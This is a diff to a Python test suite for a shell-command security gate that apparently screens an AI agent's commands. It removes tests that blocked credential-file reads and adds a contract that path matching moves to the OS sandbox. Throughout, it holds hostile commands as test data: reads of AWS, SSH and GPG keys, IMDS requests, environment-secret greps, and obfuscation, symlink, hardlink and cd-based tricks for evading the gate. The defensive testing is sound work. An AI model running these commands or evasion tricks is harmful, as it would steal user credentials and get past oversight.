-        (home / ".kiro" / "crew" / "token_signing.key").write_text("k\n")
-        monkeypatch.setenv("HOME", str(home))
-
-        assert is_sensitive_bash_command("cat $HOME/.aws/credentials") is not None
-        # Through a variable the command assigns from $HOME.
-        assert is_sensitive_bash_command("D=$HOME/.aws; cat $D/credentials") is not None
-        # As a `cd` target, with the operand a bare filename.
-        assert (
-            is_sensitive_bash_command("cd $HOME/.kiro/crew && awk 1 token_signing.key") is not None
-        )
-        # A benign remainder under the same home stays clean.
-        assert is_sensitive_bash_command("cat $HOME/notes.txt") is None
-
-    # ── Symlink-staging (pentest recommendation item 3) ──
-
-    def test_ln_home_anchored_sensitive_blocked(self) -> None:
-        assert is_sensitive_bash_command("ln -sf ~/.aws/credentials ws/cfg.ini") is not None
-        assert is_sensitive_bash_command("ln -s /Users/x/.aws/credentials cfg") is not None
-
-    def test_ln_relative_traversal_to_sensitive_blocked(self) -> None:
-        # The relative-traversal form has no home anchor — the dedicated
-        # symlink-staging guard must catch it.
-        assert is_sensitive_bash_command("ln -sf ../../../.aws/credentials cfg.ini") is not None
-        assert is_sensitive_bash_command("ln -s ../.ssh/id_rsa key") is not None
-        assert is_sensitive_bash_command("cp -s ../../.gnupg/secring.gpg g") is not None
-
-    def test_ln_benign_allowed(self) -> None:
-        assert is_sensitive_bash_command("ln -sf ./dist/app ./app") is None
-        assert is_sensitive_bash_command("ln -s ../src/main.py main.py") is None
-
-    # ── Hardlink-flatten bypass (GPT review, PR #1339) ──
-
-    def test_hardlink_to_sensitive_source_blocked(self) -> None:
-        # A HARDLINK (ln without -s, or the `link` coreutil) to a credential
-        # source flattens it onto a benign alias, dodging the path-based read
-        # matcher in standard mode (which does not bind-mask). The link verbs
-        # now route their operands through is_sensitive_path() like a read.
-        assert is_sensitive_bash_command("ln ~/.aws/credentials ws/x") is not None
-        assert is_sensitive_bash_command("link ~/.ssh/id_rsa ws/k") is not None
-
-    def test_hardlink_obfuscated_source_blocked(self) -> None:
-        # Quote-obfuscation defeats the literal regex first-pass; the normalizer
-        # (now triggered by `ln`/`link`) strips the empty quotes, expands ~, and
-        # resolves the source through is_sensitive_path(). These forms are
-        # caught ONLY via the normalizer, so they exercise the new code path for
-        # both verbs.
-        assert is_sensitive_bash_command('ln ~/.aw""s/credentials ws/x') is not None
-        assert is_sensitive_bash_command('link ~/.ss""h/id_rsa ws/k') is not None
-
-    def test_hardlink_benign_source_allowed(self) -> None:
-        # npm cacache / workspace-internal hardlinks must stay allowed.
-        assert is_sensitive_bash_command("ln node_modules/.cache/blob pkg/dep") is None
-        assert is_sensitive_bash_command("ln ./dist/a ./b") is None
-
-    def test_base64_gnupg(self) -> None:
-        result = is_sensitive_bash_command("base64 ~/.gnupg/secring.gpg")
-        assert "blocked" in result.lower()
-
-    def test_cat_sel_hmac_key_blocked(self) -> None:
-        # security-review finding cdf82704: reading the SEL HMAC key via bash is blocked
-        # (adding it to _SENSITIVE_HOME_DIRS also arms the bash-read matcher).
-        result = is_sensitive_bash_command("cat ~/.kiro/crew/sel_hmac.key")
-        assert result is not None and "blocked" in result.lower()
-        legacy = is_sensitive_bash_command("cat ~/.kirocrew/sel_hmac.key")
-        assert legacy is not None and "blocked" in legacy.lower()
-        # The key's real home since the trust/ relocation.
-        trust = is_sensitive_bash_command("cat ~/.kiro/crew/trust/sel_hmac.key")
-        assert trust is not None and "blocked" in trust.lower()
-        trust_legacy = is_sensitive_bash_command("cat ~/.kirocrew/trust/sel_hmac.key")
-        assert trust_legacy is not None and "blocked" in trust_legacy.lower()
-
-    def test_cat_security_events_log_blocked(self) -> None:
-        result = is_sensitive_bash_command("cat ~/.kiro/crew/security_events.jsonl")
-        assert result is not None and "blocked" in result.lower()
-        legacy = is_sensitive_bash_command("cat ~/.kirocrew/security_events.jsonl")
-        assert legacy is not None and "blocked" in legacy.lower()
-
-    def test_cat_rotated_security_event_segment_blocked(self) -> None:
-        # Same evidence, one rename later: a rotated segment must be as
-        # unreadable through the shell as the live log it came from.
-        rotated = is_sensitive_bash_command(
-            "cat ~/.kiro/crew/security_events.d/security_events-000001-20260821T045139Z.jsonl"
-        )
-        assert rotated is not None and "blocked" in rotated.lower()
-        legacy = is_sensitive_bash_command(
-            "cat ~/.kirocrew/security_events.d/security_events-000001-20260821T045139Z.jsonl"
-        )
-        assert legacy is not None and "blocked" in legacy.lower()
-
-    def test_write_app_admission_policy_blocked(self) -> None:
-        # Keystone invariant: a tee/rm to the admission ceiling is blocked
-        # (adding app_admission.json to _SENSITIVE_HOME_DIRS also arms the
-        # bash write/extract matcher, so the agent cannot delete or rewrite it).
-        tee = is_sensitive_bash_command("echo '{}' | tee ~/.kiro/crew/app_admission.json")
-        assert tee is not None and "blocked" in tee.lower()
-        rm = is_sensitive_bash_command("rm -f ~/.kiro/crew/app_admission.json")
-        assert rm is not None and "blocked" in rm.lower()
-        legacy = is_sensitive_bash_command("rm -f ~/.kirocrew/app_admission.json")
-        assert legacy is not None and "blocked" in legacy.lower()
-
-    def test_colon_separated_sensitive_path_blocked(self) -> None:
-        # H-p5: a sensitive path after ':' / VAR=val:path / a
-        # PATH-style colon list must be caught by the verb-independent catch-all.
-        assert is_sensitive_bash_command("FOO=bar:~/.aws/credentials echo done") is not None
-        assert is_sensitive_bash_command("PATH=/foo:~/.ssh/id_rsa:/bar") is not None
-        assert is_sensitive_bash_command("LD_PRELOAD=:~/.aws/credentials whoami") is not None
-
-    def test_git_write_verbs_on_sensitive_path_blocked(self) -> None:
-        # H-p9: file-materialising git verbs still blocked.
-        assert is_sensitive_bash_command("git checkout -- ~/.aws/credentials") is not None
-        assert is_sensitive_bash_command("git restore ~/.ssh/id_rsa") is not None
-        assert is_sensitive_bash_command("git mv x ~/.kiro/crew/profiles/p.json") is not None
-        assert is_sensitive_bash_command("git mv x ~/.kirocrew/profiles/p.json") is not None
-
-    def test_readonly_git_non_sensitive_path_allowed(self) -> None:
-        # H-p9: bare `git` was over-blocking read-only inspection.
-        # A read verb naming a NON-sensitive path must not be treated as a write.
-        assert is_sensitive_bash_command("git log -- src/app.py") is None
-        assert is_sensitive_bash_command("git diff HEAD~1 README.md") is None
-        assert is_sensitive_bash_command("git show HEAD") is None
-
-    def test_extract_into_trust_root_subdir_blocked(self) -> None:
-        # H-p6: extraction into ANY crew-home descendant (not just
-        # the root or /profiles) can drop files downstream tooling reads.
-        assert is_sensitive_bash_command("tar -xf evil.tar -C ~/.kiro/crew/foo/") is not None
-        assert is_sensitive_bash_command("unzip -d ~/.kiro/crew/foo/ evil.zip") is not None
-        assert is_sensitive_bash_command("tar -xf e.tar -C ~/.kiro/crew") is not None
-        # Legacy pre-move home is still gated.
-        assert is_sensitive_bash_command("tar -xf evil.tar -C ~/.kirocrew/foo/") is not None
-        assert is_sensitive_bash_command("tar -xf e.tar -C ~/.kirocrew") is not None
-
-    def test_normal_crew_access_not_overblocked(self) -> None:
-        # Regression guard: the broadened rules must not block routine
-        # non-sensitive crew-home access (config.json, sessions.db).
-        assert is_sensitive_bash_command("cat ~/.kiro/crew/config.json") is None
-        assert is_sensitive_bash_command("sqlite3 ~/.kiro/crew/sessions.db .tables") is None
-        assert is_sensitive_bash_command("cat ~/.kirocrew/config.json") is None
-        assert is_sensitive_bash_command("sqlite3 ~/.kirocrew/sessions.db .tables") is None
+    def test_ordinary_shell_work_is_allowed(self) -> None:
+        """Variables, ``cd`` chains, links and read-only git carry no verdict."""
+        for cmd in (
+            "B=$HOME/build; cat $B/out.txt",
+            "cat $PWD/out.txt",
+            "cd /tmp && cat notes.txt",
+            "cd ~/project && cat config.json",
+            "cd src && grep -rn pattern .",
+            "ln -sf ./dist/app ./app",
+            "ln node_modules/.cache/blob pkg/dep",
+            "git log -- src/app.py",
+            "git diff HEAD~1 README.md",
+            "tar -xf release.tar -C /tmp/build",
+            "cat ~/.kiro/crew/config.json",
+            "sqlite3 ~/.kiro/crew/sessions.db .tables",
+        ):
+            assert is_sensitive_bash_command(cmd) is None, cmd
 
     # ── IMDS short-form (inet_aton 2-/3-part) encodings ──
     # canonicalize_ip only handled 1-part and 4-part encodings, so the 2-part
@@ -4429,35 +5385,8 @@ class TestIsSensitiveBashCommand:
         assert _check_imds_access("curl http://93.184.216.34/") is None
         assert canonicalize_ip("8.8.8.8") == "8.8.8.8"
 
-    # ── Unresolved shell-variable indirection bypass ──
-
-    def test_variable_indirection_denied(self) -> None:
-        """Shell-variable indirection must not bypass the sensitive-path gate."""
-        cmd = "F=security_policy.json; cat ~/.kiro/crew/$F"
-        result = security.is_sensitive_bash_command(cmd)
-        assert result is not None
-        assert "unresolved shell variable" in result.lower() or "sensitive" in result.lower()
-
-    def test_variable_indirection_variants(self) -> None:
-        """Multiple forms of unresolved variables in path position are blocked."""
-        cases = [
-            "cat ${HOME}/.kiro/crew/${F}",
-            "cat ~/.aws/$PROFILE/credentials",
-            "cat ~/.ssh/$KEYNAME",
-        ]
-        for cmd in cases:
-            result = security.is_sensitive_bash_command(cmd)
-            assert result is not None, f"Expected denial for: {cmd}"
-
-    def test_normal_home_expansion_still_works(self) -> None:
-        """$HOME expansion to sensitive paths is still caught (regression)."""
-        cmd = "cat $HOME/.aws/config"
-        result = security.is_sensitive_bash_command(cmd)
-        assert result is not None
-
     def test_non_path_variables_allowed(self) -> None:
         """Variables that aren't in path-like tokens don't trigger the gate."""
-        # echo $USER has no / so _is_path_like is False
         safe_cases = [
             "echo $USER",
             "echo hello",
@@ -4468,1285 +5397,83 @@ class TestIsSensitiveBashCommand:
             assert result is None, f"Unexpected denial for: {cmd}"
 
 
-class TestChdirVerbSpellings:
-    """The working-directory tracker across bash, PowerShell and cmd.exe verbs.
+class TestTheBashGateMatchesNoPaths:
+    """The contract: ``is_sensitive_bash_command`` does not match paths in command text.
 
-    `is_sensitive_bash_command` runs on the raw command string of every shell
-    tool call with no per-platform branch, and the absolute-path pass already
-    accepts cmd.exe / PowerShell spellings. Tracking only ``cd`` and ``pushd``
-    therefore left the Windows spelling of cd-then-relative unmodelled.
+    Sensitive paths are enforced by the OS sandbox (which hides the credential
+    stores from the agent's process tree and mounts the governance keystone
+    read-only in every mode) and by :func:`is_sensitive_path` on every resolved
+    path the file tools open. A regex over the text of a command added no
+    protection on top of those and refused ordinary read-only work whenever a
+    fenced spelling appeared as data, so the gate carries none. Both halves are
+    pinned together: the paths it does not match, and the detectors it still
+    runs -- a test that pinned only the allowed half would pass just as well if
+    the whole gate were deleted.
     """
 
-    #: Every verb that moves the working directory, in each shell's spelling.
-    CHDIR_VERBS = (
-        "cd",
-        "pushd",
-        "chdir",
-        "sl",
-        "Set-Location",
-        "set-location",
-        "Push-Location",
+    #: Spellings the removed passes refused. Each names a credential store or the
+    #: governance keystone in the text, and each is now the sandbox's business.
+    UNMATCHED = (
+        "cat ~/.aws/credentials",
+        "cat $HOME/.ssh/id_rsa",
+        "cd ~/.kiro/crew && cat security_policy.json",
+        "tar -xf x.tar -C $HOME//.kiro/crew",
+        'V=$HOME; awk 1 "$V/.aws/credentials"',
+        "cat ~/../.aws/credentials",
+        "cd ~ & type .aws\\credentials",
+        "echo x > ~/.kiro/crew/apps/ops-mission-control/data/rotation.yaml",
     )
 
-    #: Home anchors a `cd` target can carry. Exactly the set the absolute-path
-    #: pass accepts, so the drift test below can hold both to one list. A bare
-    #: ``%HOMEPATH%`` is absent on purpose: neither pass accepts it (a
-    #: pre-existing, drive-letter-less gap in the absolute pass, out of scope
-    #: here) and listing it on one side only is the asymmetry being closed.
-    HOME_ANCHORS = (
-        "~",
-        "$HOME",
-        "%USERPROFILE%",
-        "%HOMEDRIVE%%HOMEPATH%",
-        "$env:USERPROFILE",
-        "${env:USERPROFILE}",
-        "$env:HOMEDRIVE$env:HOMEPATH",
-        "${env:HOMEDRIVE}${env:HOMEPATH}",
-    )
+    @pytest.mark.parametrize("command", UNMATCHED)
+    def test_a_path_in_command_text_is_not_a_verdict(self, command: str) -> None:
+        assert is_sensitive_bash_command(command) is None, command
 
-    @pytest.mark.parametrize("verb", CHDIR_VERBS)
-    def test_every_chdir_verb_moves_the_base(self, verb: str) -> None:
-        """A relative read after the move resolves against the directory entered."""
-        assert security.is_sensitive_bash_command(f"{verb} ~; cat .aws/credentials")
-        assert security.is_sensitive_bash_command(f"{verb} ~ && cat .ssh/id_rsa")
-        assert security.is_sensitive_bash_command(f"{verb} $HOME; cat .kiro/crew/token_signing.key")
+    def test_imds_is_still_refused(self) -> None:
+        reason = is_sensitive_bash_command("curl http://169.254.169.254/latest/meta-data/")
+        assert reason is not None and reason.startswith("Blocked: command accesses IMDS")
 
-    @pytest.mark.parametrize("verb", CHDIR_VERBS)
-    def test_every_chdir_verb_into_a_fenced_dir_taints_the_read(self, verb: str) -> None:
-        """Entering the fenced directory itself, then reading a bare filename."""
-        assert security.is_sensitive_bash_command(f"{verb} ~/.aws; cat credentials")
-        assert security.is_sensitive_bash_command(f"{verb} ~/.kiro/crew; cat token_signing.key")
+    def test_environment_credentials_are_still_refused(self) -> None:
+        reason = is_sensitive_bash_command("env | grep AWS_SECRET_ACCESS_KEY")
+        assert reason is not None and "environment" in reason
 
-    @pytest.mark.parametrize("verb", CHDIR_VERBS)
-    def test_chdir_verbs_do_not_over_block_benign_targets(self, verb: str) -> None:
-        """Recognising more verbs must not deny ordinary relative reads."""
-        assert security.is_sensitive_bash_command(f"{verb} /tmp; cat notes.txt") is None
-        assert security.is_sensitive_bash_command(f"{verb} ./build; cat log.txt") is None
-        assert security.is_sensitive_bash_command(f"{verb} ~/project; cat main.py") is None
+    def test_an_oversized_subject_is_still_refused_unscanned(self) -> None:
+        from kiro_crew.security import MAX_SCANNABLE_COMMAND_CHARS
 
-    @pytest.mark.parametrize("anchor", HOME_ANCHORS)
-    def test_home_anchor_as_a_chdir_target(self, anchor: str) -> None:
-        """Every home anchor the absolute pass accepts also anchors a `cd`.
+        reason = is_sensitive_bash_command("y" * (MAX_SCANNABLE_COMMAND_CHARS + 1))
+        assert reason is not None and "too large to security-scan" in reason
 
-        ``$env:USERPROFILE`` is why this cannot lean on the unresolved-variable
-        hypothesis: that reads it as the variable ``$env`` plus a literal
-        ``:USERPROFILE`` tail, so the hypothesis it forms is a ``~:USERPROFILE``
-        non-path that `expanduser` leaves alone and nothing matches.
-        """
-        assert security.is_sensitive_bash_command(f"cd {anchor}; type .aws/credentials")
-        assert security.is_sensitive_bash_command(f"Set-Location {anchor}; Get-Content .ssh/id_rsa")
-        assert security.is_sensitive_bash_command(f"chdir {anchor}/.aws; type credentials")
+    def test_the_path_matchers_are_absent(self) -> None:
+        """Names, not behaviour: a reinstated matcher fails loudly here."""
+        from kiro_crew import security
 
-    @pytest.mark.parametrize("anchor", HOME_ANCHORS)
-    def test_absolute_pass_and_chdir_tracker_accept_the_same_anchors(self, anchor: str) -> None:
-        """Drift guard: the two anchor lists must not diverge.
-
-        `_WINDOWS_HOME_ANCHOR_RE` mirrors the ``userprofile`` alternation inside
-        `_build_sensitive_regex`. Adding a spelling to one and not the other
-        leaves a half-covered anchor, which is exactly the asymmetry this class
-        exists to close, so pin both directions on one list.
-        """
-        # Absolute spelling: the anchor names the fenced path outright.
-        assert security.is_sensitive_bash_command(f"type {anchor}/.aws/credentials")
-        # Relative spelling: the anchor is the `cd` target, the fenced path the tail.
-        assert security.is_sensitive_bash_command(f"cd {anchor}; type .aws/credentials")
-
-    def test_benign_anchor_is_not_read_as_a_home(self) -> None:
-        """The rewriter is anchored, so it cannot fire mid-token or on a lookalike."""
-        assert security.is_sensitive_bash_command("cd /tmp/%USERPROFILE%; cat notes.txt") is None
-        assert security.is_sensitive_bash_command("cd ./%USERPROFILE%; cat main.py") is None
-        assert security.is_sensitive_bash_command("echo %USERPROFILE%") is None
-
-    def test_undoing_the_move_does_not_clear_the_denial(self) -> None:
-        """`popd` / `Pop-Location` are deliberately not modelled.
-
-        Modelling them would REMOVE a tracked base, and the base set is kept
-        monotone precisely so that adding syntax cannot walk a denial back.
-        """
-        assert security.is_sensitive_bash_command("pushd ~/.aws; popd; cat credentials")
-        assert security.is_sensitive_bash_command("Push-Location ~/.aws; Pop-Location; cat credentials")
-
-    def test_cmd_exe_drive_switch_is_not_the_target(self) -> None:
-        """`cd /d <dir>` must track <dir>, via the candidate rule.
-
-        cmd.exe's only `cd` switch sits before the target and is forward-slash
-        prefixed, so it does not look like a flag. It is NOT classified as one
-        either: a single-letter absolute path is a real POSIX directory that can
-        be the crew home, and discarding it turned `KIROCREW_HOME=/d` plus
-        `cd /d; cat token_signing.key` from denied into allowed. Keeping every
-        non-switch argument as a candidate reaches the real directory without
-        having to decide which reading of `/d` was meant.
-        """
-        assert security.is_sensitive_bash_command("chdir /d %USERPROFILE% && type .aws/credentials")
-        assert security.is_sensitive_bash_command("cd /d %USERPROFILE%; type .aws/credentials")
-        assert security.is_sensitive_bash_command("cd /D $env:USERPROFILE; type .ssh/id_rsa")
-        assert security.is_sensitive_bash_command("cd /d ~/.aws && cat credentials")
-
-    def test_slash_letter_path_stays_a_directory(self) -> None:
-        """A `/X` token is a candidate target, never a discarded flag."""
-        assert security.is_sensitive_bash_command("cd /data; cat notes.txt") is None
-        assert security.is_sensitive_bash_command("cd /d/project; cat main.py") is None
-        assert security.is_sensitive_bash_command("cd /tmp; cat notes.txt") is None
-        assert security.is_sensitive_bash_command("cd /d /tmp; cat notes.txt") is None
-        # Ratchet: the switch classification is gone, so nothing can discard a
-        # single-letter absolute path again. Only `-` prefixes are flags.
-        assert not hasattr(security, "_CHDIR_SWITCH_RE")
-        assert security._is_chdir_switch("-Path")
-        assert not security._is_chdir_switch("/d")
-
-    def test_powershell_call_operator_prefix_is_unwrapped(self) -> None:
-        """`& Set-Location ~` invokes the cmdlet, so the verb is not operand 0.
-
-        PowerShell's call operator prefixes the command the same way bash's
-        `builtin` / `command` keywords do. In bash a leading `&` never appears as
-        an operand, so unwrapping it costs the POSIX reading nothing.
-        """
-        amp = chr(38)
-        assert security.is_sensitive_bash_command(
-            amp + " Set-Location ~; Get-Content .aws/credentials"
-        )
-        assert security.is_sensitive_bash_command(amp + " cd ~; cat .aws/credentials")
-        assert security.is_sensitive_bash_command(
-            amp + " chdir %USERPROFILE%; type .kiro/crew/token_signing.key"
-        )
-
-    def test_every_non_switch_argument_is_a_candidate_target(self) -> None:
-        """A parameter's VALUE must not be mistaken for the directory.
-
-        A PowerShell common parameter takes a value that is not switch-shaped, so
-        selecting the first non-switch token picked the value and never looked at
-        the real directory. Keeping every candidate needs no list of which
-        parameters take values -- that set only grows -- and a spurious candidate
-        only adds a base, which only ever produces more denials.
-        """
-        assert security.is_sensitive_bash_command(
-            "Set-Location -ErrorAction Stop ~; Get-Content .aws/credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "Set-Location -ErrorAction Stop %USERPROFILE%; type .aws/credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "Set-Location -WarningAction SilentlyContinue ~; Get-Content .ssh/id_rsa"
-        )
-        # A parameter whose value IS the directory still works.
-        assert security.is_sensitive_bash_command(
-            "Set-Location -Path ~; Get-Content .aws/credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "Set-Location -LiteralPath ~; Get-Content .aws/credentials"
-        )
-
-    def test_extra_candidates_do_not_over_block(self) -> None:
-        """Carrying every candidate must not deny ordinary command lines."""
-        assert (
-            security.is_sensitive_bash_command(
-                "Set-Location -ErrorAction Stop /tmp; Get-Content notes.txt"
-            )
-            is None
-        )
-        assert security.is_sensitive_bash_command("cd -- ~/project; cat main.py") is None
-        assert security.is_sensitive_bash_command("cd ~/project src; cat main.py") is None
-
-    def test_secondary_taint_scan_also_reads_every_candidate(self) -> None:
-        """The substitution-aware scan must match the primary loop's selector.
-
-        A `cd` target that IS a command substitution carrying separators is only
-        visible to the segment-aware secondary scan -- the primary scan splits
-        inside `$( )` and garbles the token. Reaching it past a common
-        parameter's value needs that scan to inspect every candidate too, which
-        is a real difference in verdict and not just consistency for its own sake.
-        """
-        sub = '"$(printf %s ~; printf %s /.aws)"'
-        assert security.is_sensitive_bash_command(
-            "Set-Location -ErrorAction Stop " + sub + "; cat credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "Set-Location -WarningAction SilentlyContinue " + sub + "; cat credentials"
-        )
-        assert security.is_sensitive_bash_command("cd /d " + sub + "; cat credentials")
-
-    def test_colon_bound_parameter_payload_is_a_candidate(self) -> None:
-        """PowerShell binds a value with `:`, so the whole token starts with `-`.
-
-        `Set-Location -Path:$env:USERPROFILE/.aws` is one token beginning with a
-        dash, so the flag filter discarded it and the directory was never seen.
-        The payload after the FIRST separator is kept instead -- first, so that
-        `$env:USERPROFILE` survives intact inside it.
-        """
-        assert security.is_sensitive_bash_command(
-            "Set-Location -Path:$env:USERPROFILE/.aws; Get-Content credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "Set-Location -LiteralPath:~/.aws; Get-Content credentials"
-        )
-        assert security.is_sensitive_bash_command("Set-Location -Path:~; Get-Content .ssh/id_rsa")
-        assert security.is_sensitive_bash_command("sl -Path:%USERPROFILE%; type .aws/credentials")
-        # The `=` binder too, and a parameter name this code has never heard of.
-        assert security.is_sensitive_bash_command("cd -Path=~/.aws; cat credentials")
-        assert security.is_sensitive_bash_command("Set-Location -Somewhere:~/.aws; cat credentials")
-
-    def test_bound_payload_rule_does_not_over_block(self) -> None:
-        """A bound payload that is not a fenced directory stays allowed."""
-        assert (
-            security.is_sensitive_bash_command("Set-Location -Path:/tmp; Get-Content notes.txt")
-            is None
-        )
-        assert (
-            security.is_sensitive_bash_command("cd -Path:~/project; cat main.py") is None
-        )
-        assert security.is_sensitive_bash_command("cd -ErrorAction:Stop /tmp; cat notes.txt") is None
-        # A flag with no payload contributes no candidate at all.
-        assert security._chdir_candidates(["-Force"]) == []
-        assert security._chdir_candidates(["-Path:"]) == []
-        assert security._chdir_candidates(["--", "~/x"]) == ["~/x"]
-        assert security._chdir_candidates(["-Path:a:b"]) == ["a:b"]
-
-    def test_verb_set_has_one_home(self) -> None:
-        """Both passes read the same set, so a new spelling lands in both."""
-        assert "set-location" in security._CHDIR_VERBS
-        assert "push-location" in security._CHDIR_VERBS
-        assert "chdir" in security._CHDIR_VERBS
-        assert security._is_chdir_verb("Set-Location")
-        assert security._is_chdir_verb("/usr/bin/chdir")
-        assert not security._is_chdir_verb("cat")
-
-
-class TestNativeHomeEntryThenFencedRead:
-    """The grammar-free scan for native Windows working-directory spellings.
-
-    Pass 2 resolves the working directory by walking the command, which needs the
-    walk to agree with the shell's grammar. For a native Windows command line it
-    does not, and #5226 showed that closing the divergences one at a time does
-    not terminate (four rounds, four elements, with a fifth visible). This scan
-    answers a question that needs no grammar: was an entry into the home
-    directory seen anywhere, and does a fenced path spelled relative to it appear
-    after that?
-    """
-
-    BS = chr(92)
-    AMP = chr(38)
-    CARET = chr(94)
-    DQ = chr(34)
-    BT = chr(96)
-
-    def test_backslash_as_separator(self) -> None:
-        """POSIX tokenizing reads `\\` as an escape, so the fenced dir vanished."""
-        assert security.is_sensitive_bash_command("cd ~; cat .aws" + self.BS + "credentials")
-        assert security.is_sensitive_bash_command(
-            "cd ~; cat .kiro" + self.BS + "crew" + self.BS + "token_signing.key"
-        )
-
-    def test_single_ampersand_as_sequencer(self) -> None:
-        """cmd.exe's `&` means "then"; in bash it backgrounds, so the walk is right
-        to keep no boundary there and this belongs to a grammar-free scan."""
-        assert security.is_sensitive_bash_command("cd ~ " + self.AMP + " cat .aws/credentials")
-        assert security.is_sensitive_bash_command(
-            "cd /d %USERPROFILE% " + self.AMP + " type .aws" + self.BS + "credentials"
-        )
-
-    def test_caret_escape(self) -> None:
-        """cmd.exe's `^` escape, tolerated INSIDE the fenced pattern only.
-
-        Two distinct positions, and they are accepted by two different parts of
-        the pattern: after the LAST segment (the trailing separator group) and
-        BETWEEN segments (the join). A single-segment entry like `.aws` only
-        exercises the first, so the keystone path is covered explicitly.
-        """
-        assert security.is_sensitive_bash_command(
-            "cd ~ " + self.AMP + " type .aws" + self.CARET + self.BS + "credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "cd ~ "
-            + self.AMP
-            + " type .kiro"
-            + self.CARET
-            + self.BS
-            + "crew"
-            + self.CARET
-            + self.BS
-            + "token_signing.key"
-        )
-
-    def test_glued_drive_switch(self) -> None:
-        """`cd/d` needs no space, and `os.path.basename('cd/d')` is `'d'`."""
-        assert security.is_sensitive_bash_command(
-            "cd/d %USERPROFILE% " + self.AMP + " type .aws" + self.BS + "credentials"
-        )
-        assert security.is_sensitive_bash_command("chdir/d ~ && cat .aws/credentials")
-
-    def test_powershell_pipeline(self) -> None:
-        """A PowerShell pipeline does not fork the directory; a bash one does."""
-        assert security.is_sensitive_bash_command(
-            "Set-Location ~ -PassThru | ForEach-Object { Get-Content .aws/credentials }"
-        )
-        assert security.is_sensitive_bash_command("Set-Location ~ | Get-Content .aws/credentials")
-
-    def test_bare_chdir_lands_in_the_home_directory(self) -> None:
-        assert security.is_sensitive_bash_command("cd; cat .aws/credentials")
-        assert security.is_sensitive_bash_command(
-            "cd " + self.AMP + self.AMP + " cat .kiro/crew/token_signing.key"
-        )
-
-    def test_caret_does_not_eat_a_regex_anchor(self) -> None:
-        """The reason `^` is NOT stripped globally.
-
-        A global strip would turn `grep '^.aws/credentials'` into a path and deny
-        a file the command never opens. Tolerating the caret only between fenced
-        SEGMENTS cannot reach an anchor elsewhere in the command.
-        """
-        assert (
-            security.is_sensitive_bash_command("cd ~; grep '" + self.CARET + "foo' notes.txt")
-            is None
-        )
-        assert (
-            security.is_sensitive_bash_command("cd ~; grep -n '" + self.CARET + "def ' main.py")
-            is None
-        )
-
-    def test_no_home_entry_means_no_denial(self) -> None:
-        """The scan is ordered: the entry must be seen BEFORE the relative name."""
-        assert security.is_sensitive_bash_command("cd /tmp; cat build/out.log") is None
-        assert security.is_sensitive_bash_command("cd /tmp " + self.AMP + " cat notes.txt") is None
-        assert security.is_sensitive_bash_command("cat notes.txt") is None
-
-    def test_benign_relative_reads_after_entering_home(self) -> None:
-        assert security.is_sensitive_bash_command("cd ~; cat notes.txt") is None
-        assert security.is_sensitive_bash_command("cd ~; cat project/main.py") is None
-        assert security.is_sensitive_bash_command("Set-Location ~ | Get-Content notes.txt") is None
-        assert security.is_sensitive_bash_command("cd ~; cat my" + self.BS + " notes.txt") is None
-
-    def test_lookalike_directory_names_are_not_fenced(self) -> None:
-        """A name that merely STARTS like a fenced dir is a different directory."""
-        assert security.is_sensitive_bash_command("cd ~; cat .awsome/config") is None
-        assert security.is_sensitive_bash_command("cd ~; cat .kirocrewnotes") is None
-
-    def test_quoted_home_target(self) -> None:
-        """cmd.exe and PowerShell both accept a quoted chdir target.
-
-        `cd /d "%USERPROFILE%"` puts a quote between the whitespace and the
-        anchor, so a pattern that required the anchor to start immediately after
-        whitespace saw no entry at all.
-        """
-        assert security.is_sensitive_bash_command(
-            'cd /d "%USERPROFILE%" ' + self.AMP + " more .aws" + self.BS + "credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            'cd "~" ' + self.AMP + " cat .aws/credentials"
-        )
-        assert security.is_sensitive_bash_command("cd '~' " + self.AMP + " cat .aws/credentials")
-        assert security.is_sensitive_bash_command(
-            'cd "%USERPROFILE%"; type .aws' + self.BS + "credentials"
-        )
-
-    def test_redirection_boundary_before_the_fenced_tail(self) -> None:
-        """A redirection operator starts a path just as whitespace does.
-
-        `more<.aws\\credentials` has no space before the name. The boundary is now
-        defined by what a path IS -- the name must not be preceded by a path
-        character -- rather than by an enumerated list of the punctuation that may
-        precede it, so every operator is covered at once instead of one per round.
-        """
-        assert security.is_sensitive_bash_command(
-            "cd %USERPROFILE% " + self.AMP + " more<.aws" + self.BS + "credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "cd ~ " + self.AMP + " more<.aws/credentials"
-        )
-        assert security.is_sensitive_bash_command("cd ~; cat >.aws/credentials")
-        assert security.is_sensitive_bash_command("cd ~; {cat .aws/credentials;}")
-
-    def test_entering_a_home_SUBdirectory_is_not_entering_home(self) -> None:
-        """The trailing lookaround refuses a path continuation, not just a terminator.
-
-        `cd ~/project` moves somewhere whose `.aws` tail resolves to
-        `~/project/.aws`, which is not fenced -- so this must NOT count as an
-        entry, quoted or not.
-        """
-        assert security.is_sensitive_bash_command('cd "~/project"; cat main.py') is None
-        assert security.is_sensitive_bash_command("cd ~/project; cat .aws/credentials") is None
-        assert security.is_sensitive_bash_command("cd ~/project " + self.AMP + " cat x.py") is None
-
-    def test_longer_filename_ending_in_a_fenced_name(self) -> None:
-        """The leading lookaround also rejects a name that merely ENDS this way."""
-        assert security.is_sensitive_bash_command("cd ~; cat x.aws/credentials") is None
-        assert security.is_sensitive_bash_command("cd ~; cat my.kiro/crew/x") is None
-
-    def test_home_target_bound_to_a_parameter(self) -> None:
-        """`Set-Location -Path:~` binds the target to the flag with `:` or `=`.
-
-        The switch group would otherwise consume `-Path:~` whole and the entry
-        would never be seen. Same class as the bound-payload finding on #5226,
-        which the walk solved in `_chdir_candidates`; this raw-text scan needs its
-        own form of it.
-        """
-        assert security.is_sensitive_bash_command("Set-Location -Path:~ | Get-Content .npmrc")
-        assert security.is_sensitive_bash_command(
-            "Set-Location -Path=~ | Get-Content .aws/credentials"
-        )
-        assert security.is_sensitive_bash_command(
-            "cd -LiteralPath:%USERPROFILE% " + self.AMP + " type .aws" + self.BS + "credentials"
-        )
-
-    def test_operator_directly_after_the_fenced_name(self) -> None:
-        """The TRAILING boundary is the same non-path rule as the leading one.
-
-        Round 1 generalised only the leading side, so `type .npmrc&echo ok` stayed
-        outside the scan because `&` was not in the enumerated terminator list.
-        Stating the rule once as "a separator, or not path-adjacent" covers every
